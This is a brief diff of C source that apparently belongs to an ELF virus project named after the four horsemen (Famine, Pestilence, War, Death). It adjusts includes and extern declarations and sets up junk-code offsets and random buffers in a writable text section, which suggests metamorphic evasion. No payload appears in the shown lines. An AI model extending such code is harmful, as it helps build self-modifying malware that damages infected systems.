@@ -1,32 +1,25 @@
 #include <sys/mman.h>
 #include <sys/stat.h>
 #include <fcntl.h>
-//#include <unistd.h>
 
 #include "utils.h"
 #include "crypt.h"
 #include "death.h"
 #include "data.h"
-#include "famine.h"
 #include "syscall.h"
 
 extern void __attribute__((naked)) _start(void);
-extern void real_end(void);
-extern int g_start_offset;
-extern uint8_t g_key[KEY_SIZE];
-extern void real_start(void);
 
 int __attribute__((section(".text#"))) g_junk_offsets[NB_JUNK_MAX] = {0};
 size_t __attribute__((section(".text#"))) g_nb_junk = 0;
 uint8_t __attribute__((section(".text#"))) g_rand[RAND_SIZE] = {0};
 uint16_t __attribute__((section(".text#"))) g_ri = 0;
 
-
 void junk_death(void);
-void junk_famine(void);
-void junk_war(void);
-void junk_pestilence(void);
-void junk_main(void);
+extern void junk_famine(void);
+extern void junk_war(void);
+extern void junk_pestilence(void);
+extern void junk_main(void);
 
 void junk_death(void) {
 	char c = 'A';
